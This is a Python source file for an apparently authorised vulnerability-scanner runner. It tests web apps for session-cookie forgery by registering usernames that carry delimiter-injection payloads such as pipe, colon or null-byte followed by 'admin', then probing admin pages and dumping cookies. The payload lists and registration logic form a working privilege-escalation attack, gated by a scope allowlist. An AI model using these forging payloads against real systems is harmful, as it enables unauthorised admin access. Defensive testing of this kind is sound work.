"""cookie-tamper-probe — detects identity-token injection via input fields.

Apps that build session cookies by concatenating user-controlled strings
without escaping are vulnerable to a forging attack: an attacker registers
a username like `foo|admin|author` and gets a cookie that, when parsed,
claims they're admin. This runner registers users with delimiter-injection
patterns and verifies the resulting session grants admin context.

Gruyere R2 is the canonical example: usernames containing `|` break the
cookie format because the cookie is `<id>|<user>|<is_admin>|<is_author>`.

Migration #328: the registration endpoint and field names are discovered
generically via auth_discoverer.fetch_auth_pages + fingerprint_application
instead of the previous hardcoded `saveprofile`/`register` list. The
delimiter-injection attack itself remains custom — this probe crafts the
malicious username, so it cannot use the clean-auth acquire_session helper.
"""
from __future__ import annotations

import json
import logging
import random
import re
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.auth_discoverer import (
    fetch_auth_pages,
    fingerprint_application,
)
from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "cookie-tamper-probe"
RESULTS_ARTIFACT_NAME = "cookie-tamper-results.json"
DEFAULT_TIMEOUT = 12.0

# Delimiters commonly used inside session cookies / tokens.
DELIMITERS: tuple[tuple[str, str], ...] = (
    ("pipe", "|"),
    ("colon", ":"),
    ("semicolon", ";"),
    ("comma", ","),
    ("dollar", "$"),
    ("null_byte", "\x00"),
)

# Tail tokens to inject after the delimiter. Each token = (label, payload).
INJECTION_TAILS: tuple[tuple[str, str], ...] = (
    ("admin_flag", "admin"),
    ("admin_author", "admin{D}author"),
    ("admin_True", "admin{D}True{D}True"),
)

ADMIN_VERIFY_ENDPOINTS: tuple[str, ...] = (
    "manage.gtl",
    "manage",
    "admin",
    "admin/users",
    "",  # home page
)

ADMIN_INDICATORS: tuple[str, ...] = (
    "manage this server",
    "admin-only",
    "all users",
    "delete user",
    "administrator panel",
    "manage users",
)


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _suffix() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _path_root(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _discover_register_form(
    base: str, scope_allowlist: dict[str, Any] | None
) -> dict[str, Any] | None:
    """Migration #328: discover the register endpoint + field names
    generically via auth_discoverer instead of the previous hardcoded
    endpoint list.

    Returns {"action", "method", "user_field", "pass_field",
    "hidden_fields"} or None if no register surface found."""
    pages = fetch_auth_pages(base, scope_allowlist=scope_allowlist)
    if not pages:
        return None
    fingerprint = fingerprint_application(pages)
    reg = fingerprint.get("register_form")
    if not isinstance(reg, dict):
        return None
    fields = reg.get("fields") or []
    user_field: str | None = None
    pass_field: str | None = None
    for field in fields:
        fname = str(field.get("name") or "")
        ftype = str(field.get("type") or "").lower()
        if not fname:
            continue
        if ftype == "password" and pass_field is None:
            pass_field = fname
        elif ftype in {"text", "email", ""} and user_field is None:
            user_field = fname
    if not user_field or not pass_field:
        return None

    hidden_fields: dict[str, str] = {}
    for page in pages:
        if not isinstance(page, dict):
            continue
        html = page.get("html") or ""
        for match in re.finditer(
            r'<input[^>]*\btype=["\']hidden["\'][^>]*>', html, re.IGNORECASE
        ):
            tag = match.group(0)
            n_match = re.search(r'\bname=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            v_match = re.search(r'\bvalue=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            if n_match:
                hidden_fields.setdefault(
                    n_match.group(1),
                    v_match.group(1) if v_match else "",
                )
    return {
        "action": reg.get("action") or "",
        "method": str(reg.get("method") or "POST").upper(),
        "user_field": user_field,
        "pass_field": pass_field,
        "hidden_fields": hidden_fields,
    }


def _check_admin_access(client: httpx_client.Client, base: str) -> tuple[bool, str, str]:
    for path in ADMIN_VERIFY_ENDPOINTS:
        url = urljoin(base, path)
        try:
            resp = client.get(url, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        body_lower = (resp.text or "").lower()[:8192]
        if resp.status_code == 200 and any(ind in body_lower for ind in ADMIN_INDICATORS):
            return True, url, (resp.text or "")[:300]
    return False, "", ""


def execute_cookie_tamper_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
) -> RunnerExecution:
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)
    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "attempts": []}

        # Migration #328: discover register endpoint + field names
        # generically. The crafted-username attack itself stays here —
        # cookie_tamper cannot use acquire_session because it must
        # control the registration payload (malicious username).
        form_info = _discover_register_form(base, scope_allowlist)
        if form_info is None:
            trace_entry["attempts"].append({"step": "register_discovery", "result": "no_form_found"})
            trace.append(trace_entry)
            continue

        register_url = form_info["action"]
        register_method = form_info["method"]
        user_field = form_info["user_field"]
        pass_field = form_info["pass_field"]
        hidden_fields = form_info["hidden_fields"]
        if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, register_url):
            trace_entry["attempts"].append({"step": "register_discovery", "result": "out_of_scope"})
            trace.append(trace_entry)
            continue

        done = False
        for delim_name, delim_char in DELIMITERS:
            if done:
                break
            for tail_label, tail_template in INJECTION_TAILS:
                tail = tail_template.format(D=delim_char)
                payload_uid = f"sx{_suffix()}{delim_char}{tail}"
                pw = f"pw{_suffix()}"
                with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
                    params: dict[str, str] = {
                        **hidden_fields,
                        user_field: payload_uid,
                        pass_field: pw,
                    }
                    try:
                        if register_method == "GET":
                            resp = client.get(register_url, params=params, follow_redirects=False)
                        else:
                            resp = client.request(
                                register_method, register_url, data=params, follow_redirects=False
                            )
                    except httpx_client.RequestError:
                        continue
                    if resp.status_code not in (200, 302):
                        continue
                    if len(client.cookies) == 0:
                        # Try login to obtain a session cookie.
                        try:
                            if register_method == "GET":
                                client.get(
                                    register_url,
                                    params={user_field: payload_uid, pass_field: pw},
                                )
                            else:
                                client.request(
                                    register_method,
                                    register_url,
                                    data={user_field: payload_uid, pass_field: pw},
                                )
                        except httpx_client.RequestError:
                            pass
                    if len(client.cookies) == 0:
                        continue
                    is_admin, admin_url, evidence = _check_admin_access(client, base)
                    cookie_dump = {k: v for k, v in client.cookies.items()}
                    trace_entry["attempts"].append({
                        "endpoint": register_url,
                        "delimiter": delim_name,
                        "tail_label": tail_label,
                        "uid_payload": payload_uid,
                        "status": resp.status_code,
                        "cookie_snapshot": cookie_dump,
                        "is_admin_after": is_admin,
                    })
                    if is_admin:
                        findings_payload.append({
                            "title": f"Identity Forgery via {delim_name.title()}-Delimiter Injection in Username",
                            "severity": "critical",
                            "category": "authentication",
                            "target_id": register_url,
                            "evidence": {
                                "endpoint": register_url,
                                "delimiter": delim_char,
                                "injection_pattern": payload_uid,
                                "resulting_cookie": cookie_dump,
                                "admin_endpoint_reachable": admin_url,
                                "admin_response_excerpt": evidence,
                            },
                        })
                        stderr_lines.append(
                            f"CRITICAL: {delim_name} injection in {register_url} → admin context"
                        )
                        done = True
                        break
        trace.append(trace_entry)

    result = {"trace": trace, "findings": findings_payload, "attempt_count": sum(len(t["attempts"]) for t in trace)}
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} identity-forgery finding(s)")

    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
